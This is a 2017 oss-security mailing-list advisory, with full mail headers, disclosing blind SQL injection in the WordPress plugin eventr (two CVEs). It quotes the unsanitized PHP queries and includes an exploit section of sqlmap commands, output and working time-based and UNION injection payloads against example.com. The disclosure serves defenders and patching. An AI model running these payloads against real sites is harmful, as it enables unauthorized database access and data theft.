X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4361" "Tuesday" "30" "May" "2017" "07:35:44" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<2B1EB846-CCB8-4220-8BA4-DF901A13364F@me.com>" "101" "[oss-security] Blind SQL Injection in Wordpress plugin eventr v1.02.2" nil nil nil "5" "2017053011:35:44" "[oss-security] Blind SQL Injection in Wordpress plugin eventr v1.02.2" (number mark "U       larry0@me.co May 30  101/4361  " thread-indent "\"[oss-security] Blind SQL Injection in Wordpress plugin eventr v1.02.2\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 4040 invoked by uid 550); 30 May 2017 11:36:38 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3809 invoked from network); 30 May 2017 11:35:57 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1496144145; bh=fAVkAmnBOXzqtcLx95SlQseLZRMLiy/LnmwcyW2+sSs=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=KcJigOossy6kJAqM7z8dceNykMeqhmC/qwaN/rGBwW9uW8WyaeVOv5WpSfxZKg0nw
 a+RZfhO/LxmnCb1nhZ1DCrEbI1WjnhjttQw6mRZzUYRWkNTfgWMEKiNi+2QXU5xrMC
 Xn2JbVYtiAcNuu/3+qS0oHMUiIe0obfS7CgguLGbl/A9H54g914kmj2xAnSP/erPgN
 qAukgjEJ70k3jjoI68nD3v7q1oZ3sSsyUDq3A/CUKbGskm688guuKpnc38+mdPmBCW
 oxi3prBuNZU2aLdV0CPP/j2sbq7yk6PHWovx/vlzMnrWzwq2YoiseDd1B6Ew1FTVy1
 zuLwBUFXCw/eQ==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-05-30_08:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1705300222
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <2B1EB846-CCB8-4220-8BA4-DF901A13364F@me.com>
Date: Tue, 30 May 2017 07:35:44 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Subject: [oss-security] Blind SQL Injection in Wordpress plugin eventr v1.02.2

Title: Blind SQL Injection in Wordpress plugin eventr v1.02.2
Author: Larry W. Cashdollar, @_larry0
Date: 2017-05-21
CVE-ID:[CVE-2017-1002018][CVE-2017-1002019]
Download Site: https://wordpress.org/plugins/eventr/
Vendor: http://www.binnyva.com/
Vendor Notified: 2017-05-22
Vendor Contact: plugins@wordpress.org
Advisory: http://www.vapidlabs.com/advisory.php?v=3D192
Description: Use this plugin if you want to use your blog an event manageme=
nt tool.
Vulnerability:
The edit form and attendees.php code do not sanitize input to $_REQUSET[eve=
nt] this allows blind time-based SQL injection by an authenticated user who=
 is able to modify events.

CVE-2017-1002018
In attendees.php:

40 $search =3D '';
 41 if(isset($_REQUEST['search']) and $_REQUEST['search']) $search =3D "AND=
 A.name LIKE '%$_REQUEST[search]%'";
 42=20
 43 $all_attendee =3D $wpdb->get_results("SELECT A.ID,A.name,A.url,A.email,=
 EA.added_on, A.status FROM `{$wpdb->prefix}eventr_attendee` AS A
 44                                                                        =
         INNER JOIN `{$wpdb->prefix}eventr_event_attendee` AS EA ON attende=
e_ID=3DA.ID
 45                                                                        =
         WHERE EA.event_ID=3D$_REQUEST[event] $search ORDER BY A.name LIMIT=
 $offset, $items    _per_page");

CVE-2017-1002019

In event_form.php:

  5 $action =3D 'new';
  6 if($_REQUEST['action'] =3D=3D 'edit') $action =3D 'edit';
  7=20
  8 $event =3D array();
  9 if($action =3D=3D 'edit') {
 10         $event =3D $wpdb->get_row("SELECT name,description,event_date,m=
aximum_attendees,landing_page,status FROM {$wpdb->prefix}eventr_event WHERE=
 ID =3D $_REQUEST[event]");
 11 }

Exploit Code:
	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-admin/edit.php?page=
=3Deventr%2Fattendees.php&event=3D*' --dbms mysql  --level 3 --risk 3 --loa=
d-cookies=3D./cookies.txt
	=E2=80=A2=20=20
	=E2=80=A2 URI parameter '#1*' is vulnerable. Do you want to keep testing t=
he others (if any)? [y/N]=20
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 1250 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* (URI)
	=E2=80=A2     Type: AND/OR time-based blind
	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replac=
e (substraction)
	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/edit.php?p=
age=3Deventr/attendees.php&event=3D(SELECT * FROM (SELECT(SLEEP(5)))qppS)
	=E2=80=A2=20=20
	=E2=80=A2     Type: UNION query
	=E2=80=A2     Title: Generic UNION query (random number) - 6 columns
	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/edit.php?p=
age=3Deventr/attendees.php&event=3D-2450 UNION ALL SELECT CONCAT(0x716a7a6a=
71,0x566d4a744c4353656f664d75435376426a736e4d7056476e4d536a465169736e654b42=
52777a7161,0x716a766271),9012,9012,9012,9012,9012-- pgAi
	=E2=80=A2 ---
	=E2=80=A2 [20:38:00] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology: Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [20:38:00] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/example.com'
	=E2=80=A2=20=20
	=E2=80=A2 [*] shutting down at 20:38:00
	=E2=80=A2=20=20
	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-admin/edit.php?page=
=3Deventr%2Fevent_form.php&event=3D*&action=3Dedit' --dbms mysql  --level 3=
 --risk 3 --load-cookies=3D./cookies.txt
	=E2=80=A2=20=20
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 1476 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* (URI)
	=E2=80=A2     Type: AND/OR time-based blind
	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/edit.php?p=
age=3Deventr/event_form.php&event=3D(CASE WHEN (9111=3D9111) THEN SLEEP(5) =
ELSE 9111 END)&action=3Dedit
	=E2=80=A2 ---
	=E2=80=A2 [06:58:46] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology: Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [06:58:46] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/example.com'
	=E2=80=A2=20=20
	=E2=80=A2 [*] shutting down at 06:58:46=
